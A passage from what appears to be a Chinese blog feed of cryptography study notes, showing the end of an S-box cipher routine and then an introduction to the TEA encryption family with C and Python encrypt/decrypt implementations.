punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span>               <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span>               <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span>               <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span>               <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span>               <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span>               <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span>               <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span>               <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>               <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span>               <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span>               <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span>               <span class="token number">0x48</span><span class="token punctuation">]</span>        result <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>BOX<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@staticmethod</span>    <span class="token keyword">def</span> <span class="token function">_rot_left</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""循环左移"""</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tea加密算法学习笔记</title>
      <link href="/2024/02/17/Tea%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/17/Tea%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="tea系列概述"><a class="markdownIt-Anchor" href="#tea系列概述"></a> TEA系列概述</h1><p>TEA系列概述：</p><p>TEA算法是由剑桥大学计算机实验室的 David Wheeler 和 Roger Needham于1994年发明，TEA 是Tiny Encryption Algorithm的缩写，以加密解密速度快，实现简单著称。</p><p>TEA 算法每一次可以操作 64bit(8byte)，采用 128bit(16byte) 作为 key，算法采用迭代的形式，推荐的迭代轮数是 64轮，最少 32 轮。</p><p>为解决 TEA 算法密钥表攻击的问题，TEA 算法先后经历了几次改进，从 XTEA 到 BLOCK TEA，直至最新的XXTEA。</p><p>XTEA 也称做 TEAN：</p><p>它使用与 TEA 相同的简单运算，但四个子密钥采取不正规的方式进行混合以阻止密钥表攻击。</p><p>Block TEA 算法可以对 32 位的任意整数倍长度的变量块进行加解密的操作：</p><p>该算法将 XTEA 轮循函数依次应用于块中的每个字，并且将它附加于被应用字的邻字。</p><p>XXTEA使用跟Block TEA相似的结构：</p><p>但在处理块中每个字时利用了相邻字，且用拥有两个输入量的 MX 函数代替了 XTEA 轮循函数。</p><p>上面提到的相邻字其实就是数组中相邻的项。</p><p>TEA 系列算法中均使用了一个 DELTA 常数，但 DELTA 的值对算法并无什么影响，只是为了避免不良的取值，推荐DELTA 的值取为黄金分割数 (5√-2)/2 与 232 的乘积，取整后的十六进制值为 0x9e3779B9，用于保证每一轮加密都不相同。</p><h1 id="tea加密"><a class="markdownIt-Anchor" href="#tea加密"></a> TEA加密</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>TEA 采用与 DES 算法类似的 Feistel 结构，迭代的每次循环使用加法和移位操作，对明文和密钥进行扩散和混乱，实现明文的非线性变换。TEA 密钥长度和迭代次数都是 DES 的两倍，抗“试错法”攻击的强度不低于 DES 算法。算法以32bits 的字为运算单位，而不是耗费计算能力的逐位运算。算法没有采用 DES 那样的转换矩阵，它安全、高效、占用存储空间少，非常适合在嵌入式系统中应用</p><p>875</p><h2 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h2><p>C语言版</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">encrypt</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">;</span>  <span class="token comment">//初始化变量 v0v1分别取输入数据的两个部分</span>    <span class="token class-name">uint32_t</span> delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>       <span class="token class-name">uint32_t</span> k0<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k1<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k2<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k3<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//从密钥中取出四个部分</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sum<span class="token operator">+=</span>delta<span class="token punctuation">;</span>        v0<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        v1<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> <span class="token operator">*</span>k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v0<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v1<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sum<span class="token operator">=</span><span class="token number">0xc6ef3720</span><span class="token punctuation">,</span>i<span class="token punctuation">;</span> <span class="token comment">//sum是0x9e3778b9*32截取32位的结果</span>    <span class="token class-name">uint32_t</span> delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span><span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span> k0<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k1<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k2<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k3<span class="token operator">=</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v1<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k2<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//就是上面加密的过程逆过来</span>        v0<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k0<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token operator">+</span>sum<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k1<span class="token punctuation">)</span><span class="token punctuation">;</span>        sum<span class="token operator">-=</span>delta<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>v0<span class="token punctuation">;</span>    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前的数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后数据:%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python版</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sum1<span class="token punctuation">.</span>value<span class="token operator">+=</span>delta        v0<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        v1<span class="token punctuation">.</span>value<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span>v1<span class="token punctuation">.</span>value<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>    sum1<span class="token operator">=</span>c_uint32<span class="token punctuation">(</span>delta<span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">+</span>sum1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value<span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        v0<span class="token punctuation">.</span>value<span class="token operator">-=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value<span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span 